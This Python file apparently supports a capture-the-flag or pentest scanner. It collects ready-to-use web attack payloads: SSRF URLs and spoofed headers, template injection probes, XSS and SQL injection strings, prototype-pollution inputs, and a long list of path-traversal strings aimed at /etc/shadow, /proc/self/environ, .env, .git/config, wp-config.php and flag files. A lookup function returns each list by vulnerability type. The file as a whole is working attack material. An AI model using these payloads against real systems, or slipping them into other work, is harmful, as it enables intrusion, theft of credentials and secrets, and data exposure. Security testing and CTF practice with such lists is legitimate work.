# === SSRF Payloads ===
SSRF_PAYLOADS = [
    "http://127.0.0.1:80",
    "http://localhost:80",
    "http://[::1]:80",
    "http://0.0.0.0:80",
    "http://10.0.0.1:80",
    "http://127.0.0.1:8080",
    "http://localhost:5000",
    "http://0.0.0.0:8080"
]

SSTI_PAYLOADS = [
    "{{ 1000 * 1000 }}",
    "{{ config }}",
    "{{[].__class__}}",
]

# === XSS Payloads ===
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "'><img src=x onerror=alert('XSS')>",
    "`;alert('XSS')//",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
]

# === SQL Injection Payloads ===
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "'' OR 1=1 --",
    "\" OR \"\" = \"",
    "'; WAITFOR DELAY '0:0:5' --",
    "' AND 1=0 --",
    "' UNION SELECT NULL,NULL,NULL --",
]

# === Local File Inclusion (LFI) Payloads ===
LFI_PAYLOADS = [
    # System files
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../proc/self/environ",
    "../../../../proc/version",
    "../../../../proc/cmdline",
    "../../../../proc/self/status",
    "../../../../proc/self/fd/1",
    "../../../../proc/self/maps",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/apache2/error.log",
    "../../../../var/log/nginx/access.log",
    "../../../../var/log/nginx/error.log",
    "../../../../boot.ini",
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
    "C:\\boot.ini",
    "C:\\Windows\\win.ini",

    # Flags & secrets
    "../../../../flag",
    "../../../../flag.txt",
    "../../../../FLAG",
    "../../../../FLAG.txt",
    "../../../../.flag",
    "../../../../.flag.txt",
    "../../../../home/ctf/flag.txt",
    "../../../../home/ctf/.flag",
    "../../../../root/flag.txt",
    "../../../../tmp/flag.txt",
    "../../../../tmp/flag",
    "../../../../var/www/html/flag.txt",
    "../../../../var/www/html/secret.txt",
    "../../../../var/flag.txt",
    "../../../../app/flag",
    "../../../../data/flag.txt",
    "../../../../secrets.txt",
    "../../../../secret.txt",
    "../../../../.env",
    "../../../../.git/config",

    # Framework/Source code files
    "../../../../app.py",
    "../../../../main.py",
    "../../../../server.py",
    "../../../../wsgi.py",
    "../../../../index.py",
    "../../../../site.py",
    "../../../../manage.py",
    "../../../../application.py",
    "../../../../config.py",
    "../../../../settings.py",
    "../../../../run.py",
    "../../../../flask_app/app.py",
    "../../../../project/app.py",
    "../../../../project/main.py",
    "../../../../app/views.py",
    "../../../../src/app.py",
    "../../../../src/main.py",

    # PHP stuff
    "../../../../index.php",
    "../../../../config.php",
    "../../../../wp-config.php",
    "../../../../admin/config.php",
    "../../../../includes/config.php",
    "../../../../phpinfo.php",
    "../../../../lib/db.php",

    # Filters / tricks
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/convert.base64-encode/resource=app.py",

    # Backup/misc files
    "../../../../config.bak",
    "../../../../app.py.bak",
    "../../../../index.php~",
    "../../../../index.php.bak",
    "../../../../debug.log",
    "../../../../error.log",
    "../../../../access.log",
]


# === JavaScript Prototype Pollution Payloads ===
PROTO_POLLUTION_PAYLOADS = [
    "__proto__[polluted]=true",
    "constructor.prototype.injected=1",
    "prototype[evil]=1337",
    "__proto__.admin=true",
]

# === Header-Based SSRF Tricks ===
SSRF_HEADER_TRICKS = {
    "X-Forwarded-For": "127.0.0.1",
    "X-Original-URL": "/admin",
    "X-Forwarded-Host": "localhost",
    "X-Custom-IP-Authorization": "127.0.0.1",
}

# === Helper Functions ===

async def get_payloads(vuln_type):

    # Fetch payloads by vulnerability type (case-insensitive).

    table = {
        "ssrf": SSRF_PAYLOADS,
        "ssrf_headers": SSRF_HEADER_TRICKS,
        "xss": XSS_PAYLOADS,
        "sqli": SQLI_PAYLOADS,
        "lfi": LFI_PAYLOADS,
        "proto": PROTO_POLLUTION_PAYLOADS,
        "ssti": SSTI_PAYLOADS,
    }
    return table.get(vuln_type.lower(), [])